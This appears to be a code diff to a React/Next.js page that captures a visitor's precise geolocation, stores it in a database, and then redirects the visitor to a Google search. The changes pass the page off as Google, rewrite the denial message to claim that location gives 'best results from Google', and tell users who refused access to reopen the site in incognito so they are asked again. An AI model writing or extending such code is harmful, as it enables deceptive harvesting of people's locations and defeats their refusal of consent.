@@ -11,7 +11,6 @@ type LocationState = {
 };
 
 export default function Page() {
-
   const router = useRouter();
 
   const [location, setLocation] = useState<LocationState>({
@@ -24,6 +23,14 @@ export default function Page() {
 
   const [savedId, setSavedId] = useState<number | null>(null);
   const [permissionDenied, setPermissionDenied] = useState(false);
+  const [siteUrl, setSiteUrl] = useState<string | null>(null);
+
+  // Get current site URL (for showing user what to open in Incognito)
+  useEffect(() => {
+    if (typeof window !== "undefined") {
+      setSiteUrl(window.location.origin);
+    }
+  }, []);
 
   // 🔹 Call API to store location in DB
   const saveLocation = async (
@@ -80,7 +87,11 @@ export default function Page() {
 
         // 🔹 Save to DB
         saveLocation(lat, lng, accuracy);
-        router.push("https://www.google.com/search?q=mern+full+stack+developer+roadmap");
+
+        // 🔹 After success, redirect to Google search
+        router.push(
+          "https://www.google.com/search?q=horrible+ghost+seen+near+me"
+        );
       },
       (err) => {
         setLoading(false);
@@ -89,7 +100,7 @@ export default function Page() {
           case err.PERMISSION_DENIED:
             setPermissionDenied(true);
             setError(
-              "❌ You denied location permission. Please allow location access in your browser settings and tap Try Again."
+              "❌ You rejected location access. To get the best possible results from Google, please allow precise location."
             );
             break;
           case err.POSITION_UNAVAILABLE:
@@ -128,20 +139,47 @@ export default function Page() {
         {loading ? "Getting location..." : "Refresh / Get Location"}
       </button>
 
-      {/* If permission denied, show a strong prompt to allow it */}
+      {/* If permission denied, show a strong prompt + incognito helper */}
       {permissionDenied && (
-        <div className="max-w-xl w-full border border-red-300 bg-red-50 text-red-700 text-sm rounded p-3">
-          <p className="font-semibold mb-1">Location permission is required</p>
-          <p className="mb-2">
-            You denied location access. Please open your browser&apos;s site
-            settings, allow location for this site, then tap{" "}
-            <span className="font-semibold">“Refresh / Get Location”</span>{" "}
-            again.
+        <div className="max-w-xl w-full border border-red-300 bg-red-50 text-red-700 text-sm rounded p-3 space-y-2">
+          <p className="font-semibold mb-1">
+            Location permission is required for best results
           </p>
-          <ul className="list-disc list-inside text-xs space-y-1">
-            <li>On mobile Chrome: tap the lock icon → Permissions → Location.</li>
-            <li>On desktop: click the lock icon in the address bar → Site settings → Location.</li>
-          </ul>
+          <p>
+            You rejected location access. To get the most accurate and relevant
+            results from Google, please allow location access when the browser
+            asks again.
+          </p>
+          
+
+          {siteUrl && (
+            <div className="mt-2 text-xs">
+              <p className="mb-1 font-semibold">Your site URL:</p>
+              <p className="font-mono break-all bg-white text-red-800 px-2 py-1 rounded border border-red-200">
+                {siteUrl}
+              </p>
+              <p className="mt-1">
+                First close all incognito / private tabs, if any. Then,{" "}
+                <br></br>
+                Open Incognito / Private tab in your browser, paste this URL
+                there, and then tap{" "}
+                <span className="font-semibold">“Refresh / Get Location”</span>{" "}
+                again.
+              </p>
+              <p className="mt-1">
+                Or{" "}
+                <a
+                  href={siteUrl}
+                  target="_blank"
+                  rel="noreferrer"
+                  className="underline text-blue-700"
+                >
+                  open this site in a new window
+                </a>{" "}
+                and then manually switch to Incognito if you want.
+              </p>
+            </div>
+          )}
         </div>
       )}
 
@@ -150,7 +188,7 @@ export default function Page() {
       )}
 
       {savedId && (
-        <Link href={"https://google.com"}>
+        <Link href={"https://google.com"} className="text-blue-600 underline">
           Welcome to Google!
         </Link>
       )}
